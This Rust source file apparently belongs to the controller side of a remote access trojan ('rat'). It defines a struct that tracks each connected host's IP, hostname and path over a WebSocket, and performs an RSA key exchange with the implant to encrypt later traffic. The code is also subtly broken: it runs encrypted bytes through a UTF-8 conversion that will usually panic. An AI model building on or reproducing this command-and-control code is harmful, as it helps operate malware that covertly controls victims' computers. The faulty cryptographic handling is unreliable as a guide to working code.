use std::net::{IpAddr, SocketAddr};

use futures_util::{
    stream::{SplitSink, SplitStream},
    SinkExt, StreamExt,
};
use rsa::{
    pkcs1::{DecodeRsaPublicKey, EncodeRsaPrivateKey, EncodeRsaPublicKey},
    Pkcs1v15Encrypt, RsaPrivateKey, RsaPublicKey,
};
use tokio_tungstenite::WebSocketStream;
use tungstenite::Message;

#[derive(Debug)]
#[allow(dead_code)]
pub struct Instance {
    ip: IpAddr,
    write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
    read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
    hostname: String,
    public_key: Option<RsaPublicKey>,
    private_key: Option<RsaPrivateKey>,
    path: String,
}
impl Instance {
    pub fn new(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key: None,
            private_key: None,
            path,
        }
    }
    pub fn init_old(
        addr: SocketAddr,
        write: SplitSink<WebSocketStream<tokio::net::TcpStream>, Message>,
        read: SplitStream<WebSocketStream<tokio::net::TcpStream>>,
        hostname: String,
        public_key: Option<RsaPublicKey>,
        private_key: Option<RsaPrivateKey>,
        path: String,
    ) -> Instance {
        Instance {
            ip: addr.ip(),
            write,
            read,
            hostname,
            public_key,
            private_key,
            path,
        }
    }
    pub fn get_ip(&self) -> IpAddr {
        self.ip
    }
    pub fn get_hostname(&self) -> &str {
        &self.hostname
    }
    pub fn get_path(&self) -> &str {
        &self.path
    }
    pub fn set_public_key(&mut self, public_key: RsaPublicKey) {
        self.public_key = Some(public_key);
    }
    pub fn set_private_key(&mut self, private_key: RsaPrivateKey) {
        self.private_key = Some(private_key);
    }
    pub async fn send_message(&mut self, message: &str) {
        //make this encrypt every time when message sent
        self.write.send(Message::from(message)).await.unwrap();
    }
    pub async fn generate_keys(&mut self) -> (String, String) {
        //Send pong for rat to generate a public key
        self.send_message("pong").await;

        let mut public_key = String::from("");
        let mut private_key_string = String::from("");
        if let Some(message) = &self.read.next().await {
            public_key = message.as_ref().unwrap().to_string();
            //Generate private key and also assign it
            let private_key = &self.generate_private_key();
            private_key_string = private_key
                .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                .unwrap()
                .to_string();
            //Get public key from what user sends us
            self.set_public_key(RsaPublicKey::from_pkcs1_pem(public_key.as_str()).unwrap());
            self.set_private_key(private_key.to_owned());

            println!(
                "{}",
                self.public_key
                    .clone()
                    .unwrap()
                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                    .unwrap()
            );
            //Send my public key encrypted by users public key to user and forget about it
            let encrypted_key = &self.encrypt(
                &self.public_key.clone().unwrap(),
                private_key
                    .to_public_key()
                    .to_pkcs1_pem(rsa::pkcs8::LineEnding::LF)
                    .unwrap()
                    .as_bytes(),
            );
            for index in 0..2 {
                if index == 0 {
                    self.write
                        .send(Message::from(hex::encode(
                            std::str::from_utf8(&encrypted_key.0[..]).unwrap(),
                        )))
                        .await
                        .unwrap();
                } else {
                    self.write
                        .send(Message::from(hex::encode(
                            std::str::from_utf8(&encrypted_key.1[..]).unwrap(),
                        )))
                        .await
                        .unwrap();
                }
            }
        }

        (public_key, private_key_string)
    }
    fn generate_private_key(&self) -> RsaPrivateKey {
        let mut rng = rand::thread_rng();
        let bits = 2048;
        RsaPrivateKey::new(&mut rng, bits).expect("failed to generate a key")
    }
    fn encrypt(&self, public_key: &RsaPublicKey, data_to_enc: &[u8]) -> (Vec<u8>, Vec<u8>) {
        let mut rng = rand::thread_rng();
        let mid = data_to_enc.len() / 2;
        (
            public_key
                .encrypt(&mut rng, Pkcs1v15Encrypt, &data_to_enc[..mid])
                .expect("failed to encrypt"),
            public_key
                .encrypt(&mut rng, Pkcs1v15Encrypt, &data_to_enc[mid..])
                .expect("failed to encrypt"),
        )
    }
}
